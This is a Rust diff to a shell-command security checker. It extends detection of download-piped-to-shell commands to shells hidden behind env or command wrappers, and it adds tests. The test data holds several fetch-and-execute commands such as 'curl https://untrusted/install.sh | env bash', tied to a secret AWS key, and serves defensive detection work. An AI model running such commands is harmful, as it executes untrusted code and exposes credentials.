@@ -613,16 +613,19 @@ fn is_pipe_to_interpreter_shape(cmd: &str, shell: ShellType) -> bool {
     segs.windows(2).any(|pair| {
         let source = &pair[0];
         let sink = &pair[1];
-        // Unwrap the source through `sudo`/`env`/`command`/`time` so wrapped
-        // fetches (`sudo curl …`, `env curl …`, `command curl …`) are still
-        // recognized; the leader would otherwise be `sudo`/`env`/`command`.
-        // `resolve_wrapped_command` returns the lowercased base name (or `None`
-        // when the wrapper chain has no command word, e.g. bare `sudo`).
+        // Unwrap BOTH sides through `sudo`/`env`/`command`/`time`/`tirith` so
+        // wrapped fetches (`sudo curl …`, `env curl …`) AND wrapped shells
+        // (`… | env bash`, `… | command bash`) are still recognized; the leader
+        // would otherwise be the wrapper word. `resolve_wrapped_command` returns
+        // the lowercased base name (or `None` when the wrapper chain has no
+        // command word, e.g. bare `sudo`).
         let source_fetches = crate::extract::resolve_wrapped_command(source)
             .is_some_and(|(name, _)| is_url_fetch_command(&name));
+        let sink_is_shell = crate::extract::resolve_wrapped_command(sink)
+            .is_some_and(|(name, _)| is_shell_interpreter(&name));
         matches!(sink.preceding_separator.as_deref(), Some("|") | Some("|&"))
             && source_fetches
-            && is_shell_interpreter(&base_command(sink.command.as_deref().unwrap_or(""), shell))
+            && sink_is_shell
     })
 }
 
@@ -886,6 +889,23 @@ mod tests {
             "sudo curl http://untrusted/install.sh | bash",
             "env curl http://untrusted/install.sh | bash",
             "command curl http://untrusted/install.sh | bash",
+        ] {
+            let f = check_sensitive_exposed_to_unknown_script(cmd, ShellType::Posix, &set);
+            let f = f.unwrap_or_else(|| panic!("rule should fire for: {cmd}"));
+            assert_eq!(f.rule_id, RuleId::EnvSensitiveExposedToUnknownScript);
+            assert_eq!(f.severity, Severity::High);
+        }
+    }
+
+    #[test]
+    fn exposed_rule_fires_when_shell_sink_is_wrapped() {
+        // The shell interpreter on the SINK side is hidden behind an `env` /
+        // `command` wrapper. A shell still executes the downloaded script with
+        // the caller's environment, so the rule must fire just like bare `| bash`.
+        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
+        for cmd in [
+            "curl https://untrusted/install.sh | env bash",
+            "curl https://untrusted/install.sh | command bash",
         ] {
             let f = check_sensitive_exposed_to_unknown_script(cmd, ShellType::Posix, &set);
             let f = f.unwrap_or_else(|| panic!("rule should fire for: {cmd}"));
